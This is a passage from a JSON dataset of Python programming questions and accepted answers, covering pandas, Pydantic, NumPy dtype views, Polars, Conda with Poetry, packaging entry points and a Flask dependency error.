    "Title": "how to add elements of a list to elements of a row in pandas database",
    "Body": "i have this database  called db in pandas\n index     win  loss  moneywin  moneyloss\nplayer1     5     1       300        100\nplayer2    10     5       650        150\nplayer3    17     6      1100       1050\nplayer11  1010   105     10650      10150\nplayer23  1017   106    101100     101050\n\nand i want to add the elements of list1 to the elements of db\nlist1 = [[player1,105,101,10300,10100],[player3,17,6,1100,1050]]\n\nso the results would be db2\nindex     win   loss   moneywin  moneyloss\nplayer1   110    102   10600      10200\nplayer2    10     5     650         150\nplayer3    34     12    2200       2100\nplayer11  1010   105   10650      10150\nplayer23  1017   106   101100    101050\n\nhow can i go about it?\n",
    "AcceptedAnswerId": 71535349,
    "AcceptedAnswer": "Solution 1:\nCreate a dataframe from list1 then concat it with the given dataframe then group by index and aggregate the remaining columns using sum\ndf1 = pd.DataFrame(list1, columns=df.columns)\ndf_out = pd.concat([df, df1]).groupby('index', sort=False).sum()\n\nSolution 2:\nCreate a dataframe from list1 then add it with the given dataframe using common index\ndf1 = pd.DataFrame(list1, columns=df.columns)\ndf_out = df.set_index('index').add(df1.set_index('index'), fill_value=0)\n\nResult:\nprint(df_out)\n\n           win  loss  moneywin  moneyloss\nindex                                    \nplayer1    110   102     10600      10200\nplayer2     10     5       650        150\nplayer3     34    12      2200       2100\nplayer11  1010   105     10650      10150\nplayer23  1017   106    101100     101050\n\n"
}
{
    "Id": 71539448,
    "PostTypeId": 1,
    "Title": "Using different Pydantic models depending on the value of fields",
    "Body": "I have 2 Pydantic models (var1 and var2). The input of the PostExample method can receive data either for the first model or the second.\nThe use of Union helps in solving this issue, but during validation it throws errors for both the first and the second model.\nHow to make it so that in case of an error in filling in the fields, validator errors are returned only for a certain model, and not for both at once? (if it helps, the models can be distinguished by the length of the field A).\nmain.py\n@app.post(\"/PostExample\")\ndef postExample(request: Union[schemas.var1, schemas.var2]):\n    \n    result = post_registration_request.requsest_response()\n    return result\n  \n  \n\nschemas.py\nclass var1(BaseModel):\n    A: str\n    B: int\n    C: str\n    D: str\n  \n  \nclass var2(BaseModel):\n    A: str\n    E: int\n    F: str\n\n",
    "AcceptedAnswerId": 71545639,
    "AcceptedAnswer": "You could use Discriminated Unions (credits to @larsks for mentioning that in the comments). Setting a discriminated union, \"validation is faster since it is only attempted against one model\", as well as \"only one explicit error is raised in case of failure\". Working example below:\napp.py\nimport schemas\nfrom fastapi import FastAPI, Body\nfrom typing import Union\n\napp = FastAPI()\n\n@app.post(\"/\")\ndef submit(item: Union[schemas.Model1, schemas.Model2] = Body(..., discriminator='model_type')):\n    return item\n\nschemas.py\nfrom typing import Literal\nfrom pydantic import BaseModel\n\nclass Model1(BaseModel):\n    model_type: Literal['m1']\n    A: str\n    B: int\n    C: str\n    D: str\n  \nclass Model2(BaseModel):\n    model_type: Literal['m2']\n    A: str\n    E: int\n    F: str\n\nTest inputs - outputs\n#1 Successful Response   #2 Validation error                   #3 Validation error\n                                          \n# Request body           # Request body                        # Request body\n{                        {                                     {\n  \"model_type\": \"m1\",      \"model_type\": \"m1\",                   \"model_type\": \"m2\",\n  \"A\": \"string\",           \"A\": \"string\",                        \"A\": \"string\",\n  \"B\": 0,                  \"C\": \"string\",                        \"C\": \"string\",\n  \"C\": \"string\",           \"D\": \"string\"                         \"D\": \"string\"\n  \"D\": \"string\"          }                                     }\n}                                                              \n                        \n# Server response        # Server response                     # Server response\n200                      {                                     {\n                           \"detail\": [                           \"detail\": [\n                             {                                     {\n                               \"loc\": [                              \"loc\": [\n                                 \"body\",                               \"body\",\n                                 \"Model1\",                             \"Model2\",\n                                 \"B\"                                   \"E\"\n                               ],                                    ],\n                               \"msg\": \"field required\",              \"msg\": \"field required\",\n                               \"type\": \"value_error.missing\"         \"type\": \"value_error.missing\"\n                             }                                     },\n                           ]                                       {\n                         }                                           \"loc\": [\n                                                                       \"body\",\n                                                                       \"Model2\",\n                                                                       \"F\"\n                                                                     ],\n                                                                     \"msg\": \"field required\",\n                                                                     \"type\": \"value_error.missing\"\n                                                                   }\n                                                                 ]\n                                                               }\n\nAlternative approach would be to attempt parsing the models (based on a discriminator you pass as query/path param), as described here (Update 1).\n"
}
{
    "Id": 71068392,
    "PostTypeId": 1,
    "Title": "Group and create three new columns by condition [Low, Hit, High]",
    "Body": "I have a large dataset (~5 Mio rows) with results from a Machine Learning training. Now I want to check to see if the results hit the \"target range\" or not. Lets say this range contains all values between -0.25 and +0.25. If it's inside this range, it's a Hit, if it's below Low and on the other side High.\nI now would create this three columns Hit, Low, High and calculate for each row which condition applies and put a 1 into this col, the other two would become 0. After that I would group the values and sum them up. But I suspect there must be a better and faster way, such as calculate it directly while grouping.\n\nData\nimport pandas as pd\n\ndf = pd.DataFrame({\"Type\":[\"RF\", \"RF\", \"RF\", \"MLP\", \"MLP\", \"MLP\"], \"Value\":[-1.5,-0.1,1.7,0.2,-0.7,-0.6]})\n\n+----+--------+---------+\n|    | Type   |   Value |\n|----+--------+---------|\n|  0 | RF     |    -1.5 | <- Low\n|  1 | RF     |    -0.1 | <- Hit\n|  2 | RF     |     1.7 | <- High\n|  3 | MLP    |     0.2 | <- Hit\n|  4 | MLP    |    -0.7 | <- Low\n|  5 | MLP    |    -0.6 | <- Low\n+----+--------+---------+\n\n\nExpected Output\npd.DataFrame({\"Type\":[\"RF\", \"MLP\"], \"Low\":[1,2], \"Hit\":[1,1], \"High\":[1,0]})\n\n+----+--------+-------+-------+--------+\n|    | Type   |   Low |   Hit |   High |\n|----+--------+-------+-------+--------|\n|  0 | RF     |     1 |     1 |      1 |\n|  1 | MLP    |     2 |     1 |      0 |\n+----+--------+-------+-------+--------+\n\n",
    "AcceptedAnswerId": 71068494,
    "AcceptedAnswer": "You could use cut to define the groups and pivot_table to reshape:\n(df.assign(group=pd.cut(df['Value'],\n                        [float('-inf'), -0.25, 0.25, float('inf')],\n                        labels=['Low', 'Hit', 'High']))\n   .pivot_table(index='Type', columns='group', values='Value', aggfunc='count')\n   .reset_index()\n   .rename_axis(None, axis=1)\n)\n\nOr crosstab:\n(pd.crosstab(df['Type'],\n             pd.cut(df['Value'],\n                    [float('-inf'), -0.25, 0.25, float('inf')],\n                    labels=['Low', 'Hit', 'High'])\n             )\n   .reset_index().rename_axis(None, axis=1)\n )\n\noutput:\n  Type  Low  Hit  High\n0  MLP    2    1     0\n1   RF    1    1     1\n\n"
}
{
    "Id": 70953743,
    "PostTypeId": 1,
    "Title": "Reinterpreting NumPy arrays as a different dtype",
    "Body": "Say I have a large NumPy array of dtype int32\nimport numpy as np\nN = 1000  # (large) number of elements\na = np.random.randint(0, 100, N, dtype=np.int32)\n\nbut now I want the data to be uint32. I could do\nb = a.astype(np.uint32)\n\nor even\nb = a.astype(np.uint32, copy=False)\n\nbut in both cases b is a copy of a, whereas I want to simply reinterpret the data in a as being uint32, as to not duplicate the memory. Similarly, using np.asarray() does not help.\nWhat does work is\na.dtpye = np.uint32\n\nwhich simply changes the dtype without altering the data at all. Here's a striking example:\nimport numpy as np\na = np.array([-1, 0, 1, 2], dtype=np.int32)\nprint(a)\na.dtype = np.uint32\nprint(a)  # shows \"overflow\", which is what I want\n\nMy questions are about the solution of simply overwriting the dtype of the array:\n\nIs this legitimate? Can you point me to where this feature is documented?\nDoes it in fact leave the data of the array untouched, i.e. no duplication of the data?\nWhat if I want two arrays a and b sharing the same data, but view it as different dtypes? I've found the following to work, but again I'm concerned if this is really OK to do:\nimport numpy as np\na = np.array([0, 1, 2, 3], dtype=np.int32)\nb = a.view(np.uint32)\nprint(a)  # [0  1  2  3]\nprint(b)  # [0  1  2  3]\na[0] = -1\nprint(a)  # [-1  1  2  3]\nprint(b)  # [4294967295  1  2  3]\n\nThough this seems to work, I find it weird that the underlying data of the two arrays does not seem to be located the same place in memory:\nprint(a.data)\nprint(b.data)\n\nActually, it seems that the above gives different results each time it is run, so I don't understand what's going on there at all.\nThis can be extended to other dtypes, the most extreme of which is probably mixing 32 and 64 bit floats:\nimport numpy as np\na = np.array([0, 1, 2, np.pi], dtype=np.float32)\nb = a.view(np.float64)\nprint(a)  # [0.  1.  2.  3.1415927]\nprint(b)  # [0.0078125  50.12387848]\nb[0] = 8\nprint(a)  # [0.  2.5  2.  3.1415927]\nprint(b)  # [8.  50.12387848]\n\nAgain, is this condoned, if the obtained behaviour is really what I'm after?\n\n",
    "AcceptedAnswerId": 70990732,
    "AcceptedAnswer": "\n\nIs this legitimate? Can you point me to where this feature is documented?\n\n\nThis is legitimate. However, using np.view (which is equivalent) is better since it is compatible with a static analysers (so it is somehow safer). Indeed, the documentation states:\n\nIt\u2019s possible to mutate the dtype of an array at runtime. [...]\nThis sort of mutation is not allowed by the types. Users who want to write statically typed code should instead use the numpy.ndarray.view method to create a view of the array with a different dtype.\n\n\n\nDoes it in fact leave the data of the array untouched, i.e. no duplication of the data?\n\n\nYes. Since the array is still a view on the same internal memory buffer (a basic byte array). Numpy will just reinterpret it differently (this is directly done the C code of each Numpy computing function).\n\n\nWhat if I want two arrays a and b sharing the same data, but view it as different dtypes? [...]\n\n\nnp.view can be used in this case as you did in your example. However, the result is platform dependent. Indeed, Numpy just reinterpret bytes of memory and theoretically the representation of negative numbers can change from one machine to another. Hopefully, nowadays, all mainstream modern processors use use the two's complement (source). This means that a np.in32 value like -1 will be reinterpreted as 2**32-1 = 4294967295 with a view of type np.uint32. Positive signed values are unchanged. As long as you are aware of this, this is fine and the behaviour is predictable.\n\n\nThis can be extended to other dtypes, the most extreme of which is probably mixing 32 and 64 bit floats.\n\n\nWell, put it shortly, this is really like playing fire. In this case this certainly unsafe although it may work on your specific machine. Let us venturing into troubled waters.\nFirst of all, the documentation of np.view states:\n\nThe behavior of the view cannot be predicted just from the superficial appearance of a. It also depends on exactly how a is stored in memory. Therefore if a is C-ordered versus fortran-ordered, versus defined as a slice or transpose, etc., the view may give different results.\n\nThe thing is Numpy reinterpret the pointer using a C code. Thus, AFAIK, the strict aliasing rule applies. This means that reinterpreting a np.float32 value to a np.float64 cause an undefined behaviour. One reason is that the alignment requirements are not the same for np.float32 (typically 4) and np.float32 (typically 8) and so reading an unaligned np.float64 value from memory can cause a crash on some architecture (eg. POWER) although x86-64 processors support this. Another reason comes from the compiler which can over-optimize the code due to the strict aliasing rule by making wrong assumptions in your case (like a np.float32 value and a np.float64 value cannot overlap in memory so the modification of the view should not change the original array). However, since Numpy is called from CPython and no function calls are inlined from the interpreter (probably not with Cython), this last point should not be a problem (it may be the case be if you use Numba or any JIT though). Note that this is safe to get an np.uint8 view of a np.float32 since it does not break the strict aliasing rule (and the alignment is Ok). This could be useful to efficiently serialize Numpy arrays. The opposite operation is not safe (especially due to the alignment).\nUpdate about last section: a deeper analysis from the Numpy code show that some part of the code like type-conversion functions perform a safe type punning using the memmove C call, while some other functions like all basic unary operators or binary ones do not appear to do a proper type punning yet! Moreover, such feature is barely tested by users and tricky corner cases are likely to cause weird bugs (especially if you read and write in two views of the same array). Thus, use it at your own risk.\n"
}
{
    "Id": 71048280,
    "PostTypeId": 1,
    "Title": "Upgrade python to 3.10 in windows; Do I have to reinstall all site-packages manually?",
    "Body": "I have in windows 10 64 bit installed python 3.9 with site-packages. I would like to install python 3.10.2 on windows 10 64 bit and find a way to install packages automatically in python 3.10.2, the same ones I currently have installed in python 3.9. I am also interested in the answer to this question for windows 11 64 bit.\n",
    "AcceptedAnswerId": 71048281,
    "AcceptedAnswer": "I upgraded to python 3.10.2 in windows 10 64 bit. To properly install the packages, install the appropriate version of the Microsoft Visual C++ compiler if necessary. Details can be read https://wiki.python.org/moin/WindowsCompilers . With the upgrade to python 3.10.2 from 3.9, it turned out that I had to do it, due to errors that are appearing during the installation of the packages. Before the installing python 3.10.2, type and execute the following command in the windows command prompt:\npip freeze > reqs.txt\n\nThis command writes to the reqs.txt file the names of all installed packages in the version suitable for pip. If you run the command prompt with administrator privileges, the reqs.txt file will be saved in the directory C:\\WINDOWS\\system32.\nThen, after the installing of python 3.10.2 and the adding it to the paths in PATH, with the help of the command prompt you need to issue the command:\npip install -r reqs.txt\n\nThis will start the installing of the packages in the same versions as for python 3.9. If problems occur, e.g. an installation error appears during the installation of lxml, then you can remove from the regs.txt file the entry with the name of the package whose installation is causing the problem and then install it manually. To edit the reqs.txt file you need the administrator privileges. The easiest way is to run the command prompt in the administrator mode, type reqs.txt and click Enter to edit it.\nI decided later to update the missing packages to the latest version, because I suspected that with python 3.10.2 older versions were not compatible.\nThis means that when upgrading to python 3.10.2 it is worth asking yourself whether it is better to upgrade for all packages. To do this, you can generate the list of the outdated packages using the command:\npip list \u2013-outdated\n\nAfter the printing of the list in the command prompt, you can upgrade the outdated packages using the command:\npip install --upgrade \n\nThis can be automated by the editing of the reqs.txt file and the changing of the mark == to > which will speed up the upgrade. The mark >  should only be changed for the outdated packages or you will get an error: \"Could not find a version that satisfies the requirement ... \".\nSupplement to virtual environments:\nWhen you enter a virtual environment directory (in the windows command prompt):, such as D:\\python_projects\\data_visualization\\env\\Scripts, type activate to activate it. Then create the reqs.txt file analogous to the description above. Then, copy the file to a temporary directory. After this delete the virtual environment, e.g. using the windows explorator by the deleting of the contents of the env directory. Then, using the version of python in windows of our choice, create a virtual environment using the env directory (see: https://docs.python.org/3/library/venv.html). Copy the regs.txt file to the newly created D:\\python_projects\\data_visualization\\env\\Scripts directory. Install site-packages with the support of the regs.txt file as described above.\n"
}
{
    "Id": 71560036,
    "PostTypeId": 1,
    "Title": "How to preform loc with one condition that include two columns",
    "Body": "I have df with two columns A and B both of them are columns with string values.\nExample:\ndf_1 = pd.DataFrame(data={\n    \"A\":['a','b','c'],\n    \"B\":['a x d','z y w','q m c'] #string values not a list\n})\nprint(df_1)\n\n#output\n   A      B\n0  a  a x d\n1  b  z y w\n2  c  q m c\n\nnow what I'm trying  to do is to preform loc in the df_1 to get all the row that col B cointain the string value in col A.\nIn this example the output i want is the first and the third rows:\n   A      B\n0  a  a x d # 'a x d' contain value 'a'\n2  c  q m c # 'q m c' contain value 'c'\n\nI have tried different loc condition but got unhashable type: 'Series' error:\ndf_1.loc[df_1[\"B\"].str.contains(df_1[\"A\"])] #TypeError: unhashable type: 'Series'\ndf_1.loc[df_1[\"A\"] in df_1[\"B\"]] #TypeError: unhashable type: 'Series'\n\nI really don't want to use a for/while loop because of the size of the df.\nAny idea how can I preform this?\n",
    "AcceptedAnswerId": 71560089,
    "AcceptedAnswer": "There is no vectorial method, to map in using two columns. You need to loop here:\nmask = [a in b for a,b in zip(df_1['A'], df_1['B'])]\n\ndf_1.loc[mask]\n\nOutput:\n   A      B\n0  a  a x d\n2  c  q m c\n\ncomparison of speed (3000 rows)\n# operator.contains\n518 \u00b5s \u00b1 4.61 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 1000 loops each)\n\n# list comprehension\n554 \u00b5s \u00b1 3.84 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 1000 loops each)\n\n# numpy.apply_along_axis\n7.32 ms \u00b1 58.8 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 100 loops each)\n\n# apply\n20.7 ms \u00b1 379 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n"
}
{
    "Id": 71106690,
    "PostTypeId": 1,
    "Title": "Polars: Specify dtypes for all columns at once in read_csv",
    "Body": "In Polars, how can one specify a single dtype for all columns in read_csv?\nAccording to the docs, the dtypes argument to read_csv can take either a mapping (dict) in the form of {'column_name': dtype}, or a list of dtypes, one for each column.\nHowever, it is not clear how to specify \"I want all columns to be a single dtype\".\nIf you wanted all columns to be Utf-8 for example and you knew the total number of columns, you could do:\npl.read_csv('sample.csv', dtypes=[pl.Utf8]*number_of_columns)\n\nHowever, this doesn't work if you don't know the total number of columns.\nIn Pandas, you could do something like:\npd.read_csv('sample.csv', dtype=str)\n\nBut this doesn't work in Polars.\n",
    "AcceptedAnswerId": 71108347,
    "AcceptedAnswer": "Reading all data in a csv to any other type than pl.Utf8 likely fails with a lot of null values. We can use expressions to declare how we want to deal with those null values.\nIf you read a csv with infer_schema_length=0, polars does not know the schema and will read all columns as pl.Utf8 as that is a super type of all polars types.\nWhen read as Utf8 we can use expressions to cast all columns.\n(pl.read_csv(\"test.csv\", infer_schema_length=0)\n   .with_columns(pl.all().cast(pl.Int32, strict=False))\n\n"
}
{
    "Id": 71019671,
    "PostTypeId": 1,
    "Title": "VSCode Python Debugger stops suddenly",
    "Body": "after installing Windows updates today, debugging is not working anymore.\nThis is my active debug configuration:\n\"launch\": {\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"DEBUG CURR\",\n      \"type\": \"python\",\n      \"request\": \"launch\",\n      \"program\": \"${file}\",\n      \"console\": \"internalConsole\",\n      \"justMyCode\": false,\n      \"stopOnEntry\": false,\n    }...\n\nWhen I start the debugger, the menu pops up briefly for 1-2 seconds. But then it closes. There is no output in the console.\nIt does not stop at set breakpoints.\nDoes anybody have the same problem? Is there a solution?\nSystem settings\n\nOS: Microsoft Windows 10 Enterprise (10.0.17763 Build 17763)\nVSCode version 1.64.0\nPython version: 3.8.11 (in the active Anaconda Environment)\n\nInstalled VSCode extensions:\n\nPython (Microsoft) version: v2022.0.1786462952\nPylance (Microsoft) version: v2022.2.0\n\n",
    "AcceptedAnswerId": 71020430,
    "AcceptedAnswer": "It's an issue with the latest Python Extension for VSCode.\nDowngrading the python extension to v2021.12.1559732655 fixes the problem.\n\n"
}
{
    "Id": 71027193,
    "PostTypeId": 1,
    "Title": "DatetimeIndex.get_loc is deprecated",
    "Body": "I updated Pandas to 1.4.0 with yfinance 0.1.70.  Previously, I had to stay with Pandas 1.3.5 as Pandas and yfinance did't play well together.  These latest versions of Pandas and yfinance now work together, BUT Pandas now gives me this warning:\nFuture Warning: Passing method to DatetimeIndex.get_loc is deprecated... Use index.get_indexer([item], method=...) instead\n\nI had enough trouble as a novice Python person getting the original get_loc statement to work:\nlast_week = format((df.index[df.index.get_loc(last_week, method='nearest')]).strftime('%Y-%m-%d'))\n\nThis statement allowed me to get a date from the dataframe that I could use further in determining the value associated with that date:\nweek_value = df.loc[last_week, ans]\n\nTruth be known, I am intimidated in trying to change this statement to be compliant with the new and improved get_indexer function.  Can someone help me out please?\n",
    "AcceptedAnswerId": 71027209,
    "AcceptedAnswer": "Should be pretty simple. Just change get_loc(XXX, ...) to get_indexer([XXX], ...)[0]:\nlast_week = format((df.index[df.index.get_indexer([last_week], method='nearest')[0]]).strftime('%Y-%m-%d'))\n\n"
}
{
    "Id": 70851048,
    "PostTypeId": 1,
    "Title": "Does it make sense to use Conda + Poetry?",
    "Body": "Does it make sense to use Conda + Poetry for a Machine Learning project? Allow me to share my (novice) understanding and please correct or enlighten me:\nAs far as I understand, Conda and Poetry have different purposes but are largely redundant:\n\nConda is primarily a environment manager (in fact not necessarily Python), but it can also manage packages and dependencies.\nPoetry is primarily a Python package manager (say, an upgrade of pip), but it can also create and manage Python environments (say, an upgrade of Pyenv).\n\nMy idea is to use both and compartmentalize their roles: let Conda be the environment manager and Poetry the package manager. My reasoning is that (it sounds like) Conda is best for managing environments and can be used for compiling and installing non-python packages, especially CUDA drivers (for GPU capability), while Poetry is more powerful than Conda as a Python package manager.\nI've managed to make this work fairly easily by using Poetry within a Conda environment. The trick is to not use Poetry to manage the Python environment: I'm not using commands like poetry shell or poetry run, only poetry init, poetry install etc (after activating the Conda environment).\nFor full disclosure, my environment.yml file (for Conda) looks like this:\nname: N\n\nchannels:\n  - defaults\n  - conda-forge\n\ndependencies:\n  - python=3.9\n  - cudatoolkit\n  - cudnn\n\nand my poetry.toml file looks like that:\n[tool.poetry]\nname = \"N\"\nauthors = [\"B\"]\n\n[tool.poetry.dependencies]\npython = \"3.9\"\ntorch = \"^1.10.1\"\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\nTo be honest, one of the reasons I proceeded this way is that I was struggling to install CUDA (for GPU support) without Conda.\nDoes this project design look reasonable to you?\n",
    "AcceptedAnswerId": 71110028,
    "AcceptedAnswer": "I have experience with a Conda + Poetry setup, and it's been working fine. The great majority of my dependencies are specified in pyproject.toml, but when there's something that's unavailable in PyPI, or installing it with Conda is easier, I add it to environment.yml. Moreover, Conda is used as a virtual environment manager, which works well with Poetry: there is no need to use poetry run or poetry shell, it is enough to activate the right Conda environment.\nTips for creating a reproducible environment\n\nAdd Poetry, possibly with a version number (if needed), as a dependency in environment.yml, so that you get Poetry installed when you run conda create, along with Python and other non-PyPI dependencies.\nAdd conda-lock, which gives you lock files for Conda dependencies, just like you have poetry.lock for Poetry dependencies.\nConsider using mamba which is generally compatible with conda, but is better at resolving conflicts, and is also much faster. An additional benefit is that all users of your setup will use the same  package resolver, independent from the locally-installed version of Conda.\nBy default, use Poetry for adding Python dependencies. Install packages via Conda if there's a reason to do so (e.g. in order to get a CUDA-enabled version). In such a case, it is best to specify the package's exact version in environment.yml, and after it's installed, to add an entry with the same version specification to Poetry's pyproject.toml (without ^ or ~ before the version number). This will let Poetry know that the package is there and should not be upgraded.\nIf you use a different channels that provide the same packages, it might be not obvious which channel a particular package will be downloaded from. One solution is to specify the channel for the package using the :: notation (see the pytorch entry below), and another solution is to enable strict channel priority. Unfortunately, in Conda 4.x there is no way to enable this option through environment.yml.\nNote that Python adds user site-packages to sys.path, which may cause lack of reproducibility if the user has installed Python packages outside Conda environments. One possible solution is to make sure that the PYTHONNOUSERSITE environment variable is set to True (or to any other non-empty value).\n\nExample\nenvironment.yml:\nname: my_project_env\nchannels:\n  - pytorch\n  - conda-forge\n  # We want to have a reproducible setup, so we don't want default channels,\n  # which may be different for different users. All required channels should\n  # be listed explicitly here.\n  - nodefaults\ndependencies:\n  - python=3.10.*  # or don't specify the version and use the latest stable Python\n  - mamba\n  - pip  # pip must be mentioned explicitly, or conda-lock will fail\n  - poetry=1.*  # or 1.1.*, or no version at all -- as you want\n  - tensorflow=2.8.0\n  - pytorch::pytorch=1.11.0\n  - pytorch::torchaudio=0.11.0\n  - pytorch::torchvision=0.12.0\n\n# Non-standard section listing target platforms for conda-lock:\nplatforms:\n  - linux-64\n\nvirtual-packages.yml (may be used e.g. when we want conda-lock to generate CUDA-enabled lock files even on platforms without CUDA):\nsubdirs:\n  linux-64:\n    packages:\n      __cuda: 11.5\n\nFirst-time setup\nYou can avoid playing with the bootstrap env and simplify the example below if you have conda-lock, mamba and poetry already installed outside your target environment.\n# Create a bootstrap env\nconda create -p /tmp/bootstrap -c conda-forge mamba conda-lock poetry='1.*'\nconda activate /tmp/bootstrap\n\n# Create Conda lock file(s) from environment.yml\nconda-lock -k explicit --conda mamba\n# Set up Poetry\npoetry init --python=~3.10  # version spec should match the one from environment.yml\n# Fix package versions installed by Conda to prevent upgrades\npoetry add --lock tensorflow=2.8.0 torch=1.11.0 torchaudio=0.11.0 torchvision=0.12.0\n# Add conda-lock (and other packages, as needed) to pyproject.toml and poetry.lock\npoetry add --lock conda-lock\n\n# Remove the bootstrap env\nconda deactivate\nrm -rf /tmp/bootstrap\n\n# Add Conda spec and lock files\ngit add environment.yml virtual-packages.yml conda-linux-64.lock\n# Add Poetry spec and lock files\ngit add pyproject.toml poetry.lock\ngit commit\n\nUsage\nThe above setup may seem complex, but it can be used in a fairly simple way.\nCreating the environment\nconda create --name my_project_env --file conda-linux-64.lock\nconda activate my_project_env\npoetry install\n\nActivating the environment\nconda activate my_project_env\n\nUpdating the environment\n# Re-generate Conda lock file(s) based on environment.yml\nconda-lock -k explicit --conda mamba\n# Update Conda packages based on re-generated lock file\nmamba update --file conda-linux-64.lock\n# Update Poetry packages and re-generate poetry.lock\npoetry update\n\n"
}
{
    "Id": 71191907,
    "PostTypeId": 1,
    "Title": "\"No module named x.__main__; 'x' is a package and cannot be directly executed\" when using entry_points / console_scripts",
    "Body": "I have this CLI tool called Rackfocus. I've published to PyPI, and I'm reasonably sure it worked just fine before. When I try to run it with current versions of Python on Mac, I get the error:\nNo module named rackfocus.__main__; 'rackfocus' is a package\nand cannot be directly executed\n\nAll I want is one package with one entry point that users can download and use using pip.\nBased on tutorials, I have this in setup.py:\npackages=['rackfocus']\nentry_points = {\n    'console_scripts': [\n        'rackfocus=rackfocus.run:main'\n    ]\n}\n\nAnd I have a rackfocus.run:main function, an init.py and everything.  What's wrong?\nYou can reproduce this locally:\n\nClone my repo.\nCreate and activate a virtualenv (optional).\npip3 install -e .\npython3 -m rackfocus\n\n",
    "AcceptedAnswerId": 71192123,
    "AcceptedAnswer": "entry_points = {\n    'console_scripts': [\n        'rackfocus=rackfocus.run:main'\n    ]\n}\n\nThis tells the packaging system to create a wrapper executable named rackfocus. That executable will automatically handle all the necessary steps to get Python off the ground, find the run module in the rackfocus package, find its main function and call it.\nYou run the executable like rackfocus (if you are using a virtual environment, it should be on the path already), not python -m rackfocus.\nUsing python -m rackfocus is completely unrelated to that (it doesn't even have anything to do with packaging, and can easily be used with code that hasn't been installed yet). It doesn't use the wrapper; instead, it simply attempts to execute the rackfocus module. But in your case, rackfocus isn't a module; it's a package. The error message means exactly what it says.\nYou would want python -m rackfocus.run to execute the run module - but of course, that still doesn't actually call main() (just like it wouldn't with python rackfocus/main.py - though the -m approach is more powerful; in particular, it allows your relative imports to work).\nThe error message says rackfocus.__main__ because you can make a package runnable by giving it a __main__ module.\n"
}
{
    "Id": 71189819,
    "PostTypeId": 1,
    "Title": "ImportError: cannot import name 'json' from itsdangerous",
    "Body": "I am trying to get a Flask and Docker application to work but when I try and run it using my docker-compose up command in my Visual Studio terminal, it gives me an ImportError called ImportError: cannot import name 'json' from itsdangerous. I have tried to look for possible solutions to this problem but as of right now there are not many on here or anywhere else. The only two solutions I could find are to change the current installation of MarkupSafe and itsdangerous to a higher version: https://serverfault.com/questions/1094062/from-itsdangerous-import-json-as-json-importerror-cannot-import-name-json-fr and another one on GitHub that tells me to essentially change the MarkUpSafe and itsdangerous installation again https://github.com/aws/aws-sam-cli/issues/3661, I have also tried to make a virtual environment named veganetworkscriptenv to install the packages but that has also failed as well. I am currently using Flask 2.0.0 and Docker 5.0.0 and the error occurs on line eight in vegamain.py.\nHere is the full ImportError that I get when I try and run the program:\nveganetworkscript-backend-1  | Traceback (most recent call last):\nveganetworkscript-backend-1  |   File \"/app/vegamain.py\", line 8, in \nveganetworkscript-backend-1  |     from flask import Flask\nveganetworkscript-backend-1  |   File \"/usr/local/lib/python3.9/site-packages/flask/__init__.py\", line 19, in \nveganetworkscript-backend-1  |     from . import json\nveganetworkscript-backend-1  |   File \"/usr/local/lib/python3.9/site-packages/flask/json/__init__.py\", line 15, in \nveganetworkscript-backend-1  |     from itsdangerous import json as _json\nveganetworkscript-backend-1  | ImportError: cannot import name 'json' from 'itsdangerous' (/usr/local/lib/python3.9/site-packages/itsdangerous/__init__.py)\nveganetworkscript-backend-1 exited with code 1\n\nHere are my requirements.txt, vegamain.py, Dockerfile, and docker-compose.yml files:\nrequirements.txt:\nFlask==2.0.0\nFlask-SQLAlchemy==2.4.4\nSQLAlchemy==1.3.20\nFlask-Migrate==2.5.3\nFlask-Script==2.0.6\nFlask-Cors==3.0.9\nrequests==2.25.0\nmysqlclient==2.0.1\npika==1.1.0\nwolframalpha==4.3.0\n\nvegamain.py:\n# Veganetwork (C) TetraSystemSolutions 2022\n# all rights are reserved.  \n# \n# Author: Trevor R. Blanchard Feb-19-2022-Jul-30-2022\n#\n\n# get our imports in order first\nfrom flask import Flask # <-- error occurs here!!!\n\n# start the application through flask.\napp = Flask(__name__)\n\n# if set to true will return only a \"Hello World\" string.\nDebug = True\n\n# start a route to the index part of the app in flask.\n@app.route('/')\ndef index():\n    if (Debug == True):\n        return 'Hello World!'\n    else:\n        pass\n\n# start the flask app here --->\nif __name__ == '__main__':\n    app.run(debug=True, host='0.0.0.0') \n\nDockerfile:\nFROM python:3.9\nENV PYTHONUNBUFFERED 1\nWORKDIR /app\nCOPY requirements.txt /app/requirements.txt\nRUN pip install -r requirements.txt\nCOPY . /app\n\ndocker-compose.yml:\nversion: '3.8'\nservices:\n  backend:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    command: 'python vegamain.py'\n    ports:\n      - 8004:5000\n    volumes:\n      - .:/app\n    depends_on:\n      - db\n\n#  queue:\n#    build:\n#      context: .\n#      dockerfile: Dockerfile\n#    command: 'python -u consumer.py'\n#    depends_on:\n#      - db\n\n  db:\n    image: mysql:5.7.22\n    restart: always\n    environment:\n      MYSQL_DATABASE: admin\n      MYSQL_USER: root\n      MYSQL_PASSWORD: root\n      MYSQL_ROOT_PASSWORD: root\n    volumes:\n      - .dbdata:/var/lib/mysql\n    ports:\n      - 33069:3306\n\nHow exactly can I fix this code? thank you!\n",
    "AcceptedAnswerId": 71219718,
    "AcceptedAnswer": "I just put itsdangerous==2.0.1 in my requirements.txt .Then updated my virtualenv using pip install -r requirements.txt and then docker-compose up --build . Now everything fine for me. Didnot upgrade the flask version.\n"
}
{
    "Id": 71567315,
    "PostTypeId": 1,
    "Title": "How to get the SSIM comparison score between two images?",
